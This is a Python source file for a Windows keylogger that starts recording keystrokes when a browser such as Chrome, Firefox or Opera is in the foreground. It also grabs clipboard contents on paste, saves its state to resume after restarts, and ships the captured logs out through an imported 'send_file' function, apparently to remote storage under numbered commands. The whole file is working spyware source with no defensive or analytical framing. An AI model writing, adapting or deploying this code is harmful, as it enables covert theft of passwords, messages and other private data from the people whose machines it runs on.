from .drive import send_file
from logger import log
import atexit
import time
from queue import Empty, Queue
from threading import Event, Thread
from typing import Tuple

import psutil
import win32clipboard as clip
import win32gui
import win32process
from pynput.keyboard import Key

from .keyboard import BrowserHotKeys
from .util import data_store


session="klogger_session"
browsers=("iexplore.exe", "chrome.exe", "firefox.exe", "Yandex.exe", "opera.exe", "UCBrowser.exe", "Brave.exe")

class Any_process:
    def __contains__(self, item):
        return True

class Keyloger:
    def __init__(self):
        self.command_sec=-1
        self.targets = set()
        self.keys={
            "<ctrl>+v":self.paste,
            "<shift>+<insert>":self.paste
        }

        self.data = Queue()
        self.log = Event()
        self.log.clear()

        self.left_size = 0# size in bytes
        self._running = False

        self.smell_bowser:Thread = None
        self.listener:BrowserHotKeys = None

    def watch_dog(self):
        while self.left_size>0 and self._running:
            pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow()) #This produces a list of PIDs active window relates to
            try:
                pname=psutil.Process(pid[-1]).name() #pid[-1] is the most likely to survive last longer
            except:
                continue
            
            #active keylogger
            if pname in self.targets:
                self.log.set()
            else:
                self.log.clear()
            time.sleep(.25)
        
        data_store.reset(session)
        self.stop()

    def paste(self):
        clip.OpenClipboard()
        data=clip.GetClipboardData()
        clip.CloseClipboard()
        log.debug(f'paste detected : {data}')
        return data

    def on_press(self, clip, key):
        if not self.log.is_set():
            return

        if clip:
            key=clip
        elif type(key)==Key:
            key=key.name
        key=str(key)+r"\n"

        log.info(key)

        self.data.put(key)
        # 1 byte per charecter
        self.left_size -= len(key)
        self.log.wait()
    
    def mail_log(self):
        log.info(f"sending dumped keylog for {self.targets}.")
        log.debug(f"left size: {self.left_size}")

        data=""
        while not self.data.empty():
            try:
                data+=self.data.get_nowait()
            except Empty:
                break
        send_file(f"key_dump_{self.command_sec}.log", data)

    def start(self):
        if self.running:
            return
        
        self.smell_bowser = Thread(target=self.watch_dog, name='browser_detector', daemon=True)
        Thread(target=self.key_log, name="key_listener", daemon=True).start()
        
        self._running = True
        self.smell_bowser.start()

    def key_log(self):
        with BrowserHotKeys(self.keys, self.on_press) as listener:
            self.listener = listener
            listener.join()

    def save_and_stop(self):
        if not self.running:
            return 
        
        log.info('pausing key logger.')
        most_obious={
            "command_sec":self.command_sec,
            "left_size":self.left_size,
            "targets":None if type(self.targets) is Any_process else self.targets
        }
        data_store.set_value(session, most_obious)
        self.stop()

    def stop(self):
        if not self.running:
            return 
        
        log.info(f"stoping keyloger")
        try:
            self.listener.stop()
        except:# incase listener is None
            pass
        self._running=False# this should stop the watch_dog

        self.mail_log()

    @property
    def running(self):
        return self._running
        # return self.smell_bowser.is_alive() and self._running


default_logger=Keyloger()
atexit.register(default_logger.save_and_stop)

def attach_to_logger(command_sec, left_size:"bytes", targets):
    log.debug(f"command_sec: {command_sec}, max_size in bytes: {left_size}")
    if default_logger.running:
        default_logger.stop()

        default_logger.command_sec=command_sec
        default_logger.left_size+=left_size
        if type(default_logger.targets) is set:
            log.info(f'targets extended with {targets} ')
            default_logger.targets.update(targets)
        
        default_logger.start()
        return 
    # for now ignoring the situation where logger not running as well as not resumed

    log.info(f'key logger started for {targets}')
    default_logger.command_sec=command_sec
    default_logger.left_size=left_size
    default_logger.targets = targets or Any_process()
    default_logger.start()

def start_logger(command_sec, max_size:"MB"=3, targets=browsers):
    log.info(f'key logger started for {targets}')
    log.debug(f"command_sec: {command_sec}, max_size: {max_size}")
    attach_to_logger(command_sec, max_size*1048576, targets)

def resume_keylogger():
    kwargs=getattr(data_store.var, session)
    if not kwargs.get('left_size', 0)>0:
        return

    log.info(f'restarting key logger')
    attach_to_logger(**kwargs)


if __name__=="__main__":
    # main test
    snap_key=Keyloger(.00015)
    snap_key.start()
    log.info("main thread finished")
